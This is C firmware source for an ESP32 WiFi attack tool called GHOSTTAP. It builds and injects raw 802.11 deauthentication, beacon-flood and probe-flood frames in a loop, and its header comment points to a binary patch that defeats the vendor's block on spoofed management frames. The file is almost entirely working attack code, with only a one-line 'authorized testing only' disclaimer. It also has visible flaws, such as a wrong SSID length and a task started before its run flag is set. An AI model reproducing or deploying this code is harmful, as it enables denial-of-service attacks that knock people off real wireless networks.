/*
 * GHOSTTAP WiFi attack engine — raw 802.11 frame injection.
 *
 * Brings WiFi up in AP mode and drives esp_wifi_80211_tx() to emit
 * deauth / beacon-flood / probe-flood frames.
 *
 * IMPORTANT (ESP32-C5): the stock IDF libnet80211.a refuses to transmit
 * management frames with a spoofed source address. Apply the binary
 * patch in patches/ (run patches/apply_libnet80211_patch.sh) to enable
 * full injection, or limit usage to 2.4 GHz.
 *
 * This firmware is for authorized security testing only.
 */
#include <string.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"

#include "modules/wifi_attack.h"
#include "modules/wifi_scan.h"

static const char *TAG = "wifi_attack";

static attack_state_t s_state;
static TaskHandle_t   s_task;
static bool           s_ap_netif;

/* ---- frame control helpers ---------------------------------------- */
#define FC0(type, sub) (((sub) << 4) | ((type) << 2) | 0)
static const uint8_t s_rates[8] = { 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24 };

static void put_ie(uint8_t *buf, uint8_t *off, uint8_t tag, const uint8_t *val, uint8_t len)
{
    buf[(*off)++] = tag;
    buf[(*off)++] = len;
    if (len) { memcpy(&buf[*off], val, len); *off += len; }
}

static size_t build_beacon(const char *ssid, uint8_t channel,
                           const uint8_t bssid[6], uint64_t ts, uint8_t *buf)
{
    uint8_t off = 0;
    buf[off++] = FC0(0, 8);            /* beacon mgmt frame */
    buf[off++] = 0x00;
    buf[off++] = 0x00;                 /* duration */
    buf[off++] = 0x00;
    memset(&buf[off], 0xff, 6); off += 6;   /* da = broadcast */
    memcpy(&buf[off], bssid, 6); off += 6;  /* sa */
    memcpy(&buf[off], bssid, 6); off += 6;  /* bssid */
    buf[off++] = 0x00;                 /* seq */
    buf[off++] = 0x00;
    for (int i = 0; i < 8; i++) buf[off++] = (ts >> (8 * i)) & 0xff;
    buf[off++] = 0x64; buf[off++] = 0x00;   /* beacon interval 100 */
    buf[off++] = 0x04; buf[off++] = 0x00;   /* capability: ESS */

    size_t ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;
    put_ie(buf, &off, 0x00, (const uint8_t *)ssid, ssid_len);
    put_ie(buf, &off, 0x01, s_rates, sizeof(s_rates));
    put_ie(buf, &off, 0x03, &channel, 1);
    return off;
}

static size_t build_deauth(const uint8_t bssid[6], const uint8_t client[6],
                           uint16_t reason, uint8_t *buf)
{
    uint8_t off = 0;
    buf[off++] = FC0(0, 12);           /* deauth */
    buf[off++] = 0x00;
    buf[off++] = 0x00; buf[off++] = 0x00;   /* duration */
    memcpy(&buf[off], client, 6); off += 6;
    memcpy(&buf[off], bssid, 6); off += 6;
    memcpy(&buf[off], bssid, 6); off += 6;
    buf[off++] = 0x00; buf[off++] = 0x00;   /* seq */
    buf[off++] = reason & 0xff;
    buf[off++] = (reason >> 8) & 0xff;
    return off;
}

static size_t build_probe(const char *ssid, const uint8_t sa[6], uint8_t *buf)
{
    uint8_t off = 0;
    buf[off++] = FC0(0, 4);            /* probe request */
    buf[off++] = 0x00;
    buf[off++] = 0x00; buf[off++] = 0x00;   /* duration */
    memset(&buf[off], 0xff, 6); off += 6;   /* da */
    memcpy(&buf[off], sa, 6); off += 6;
    memset(&buf[off], 0xff, 6); off += 6;   /* bssid */
    buf[off++] = 0x00; buf[off++] = 0x00;   /* seq */
    size_t ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;
    put_ie(buf, &off, 0x00, (const uint8_t *)ssid, ssid_len);
    put_ie(buf, &off, 0x01, s_rates, sizeof(s_rates));
    return off;
}

/* ---- radio mode handling ------------------------------------------ */
static esp_err_t radio_to_ap(void)
{
    esp_wifi_stop();
    if (!s_ap_netif) {
        esp_netif_create_default_wifi_ap();
        s_ap_netif = true;
    }
    wifi_config_t cfg = {
        .ap = {
            .ssid = "GHOSTTAP",
            .ssid_len = 5,
            .channel = s_state.channel,
            .max_connection = 1,
            .authmode = WIFI_AUTH_OPEN,
        },
    };
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_set_config(WIFI_IF_AP, &cfg);
    esp_wifi_start();
    return ESP_OK;
}

static esp_err_t radio_back_to_sta(void)
{
    esp_wifi_stop();
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    return ESP_OK;
}

/* ---- attack task --------------------------------------------------- */
static void attack_task(void *arg)
{
    uint8_t buf[ATTACK_FRAME_LEN];
    uint8_t sa[6] = { 0x02, 0x00, 0x00, 0x00, 0x00, 0x01 };
    uint64_t ts = 0;

    while (s_state.running) {
        size_t len = 0;

        switch (s_state.type) {
        case ATTACK_DEAUTH:
        case ATTACK_DEAUTH_ALL:
            len = build_deauth(s_state.bssid, s_state.client, 0x0001, buf);
            esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
            break;
        case ATTACK_BEACON:
            ts += 100;   /* TU tick */
            len = build_beacon(s_state.ssids[0], s_state.channel, s_state.bssid, ts, buf);
            esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
            break;
        case ATTACK_PROBE: {
            sa[5]++;
            len = build_probe(s_state.ssids[0], sa, buf);
            esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
            break;
        }
        default:
            s_state.running = false;
            break;
        }

        if (len) s_state.sent++;
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    vTaskDelete(NULL);
}

esp_err_t wifi_attack_init(void)
{
    if (s_state.running) return ESP_ERR_INVALID_STATE;
    /* Ensure NVS/netif/event-loop and initial STA wifi are up. */
    ESP_ERROR_CHECK(wifi_scan_init());
    return radio_to_ap();
}

esp_err_t wifi_attack_start(attack_type_t type, const uint8_t *bssid,
                            const uint8_t *client, const char *ssid,
                            uint8_t channel)
{
    if (s_state.running) return ESP_ERR_INVALID_STATE;

    memset(&s_state, 0, sizeof(s_state));
    s_state.type = type;
    s_state.channel = channel ? channel : 6;

    if (bssid) memcpy(s_state.bssid, bssid, 6);
    if (client) {
        memcpy(s_state.client, client, 6);
    } else {
        memset(s_state.client, 0xff, 6);
    }
    if (ssid) snprintf(s_state.ssids[0], sizeof(s_state.ssids[0]), "%s", ssid);
    else snprintf(s_state.ssids[0], sizeof(s_state.ssids[0]), "GHOSTTAP");
    s_state.ssid_count = 1;

    ESP_LOGI(TAG, "attack start type=%d ch=%u", (int)type, channel);

    xTaskCreate(attack_task, "attack", 3072, NULL, 4, &s_task);
    s_state.running = true;
    return ESP_OK;
}

esp_err_t wifi_attack_stop(void)
{
    if (!s_state.running) return ESP_OK;
    s_state.running = false;
    ESP_LOGI(TAG, "attack stop (sent %lu)", (unsigned long)s_state.sent);
    radio_back_to_sta();
    return ESP_OK;
}

void wifi_attack_get_state(attack_state_t *out)
{
    if (out) *out = s_state;
}
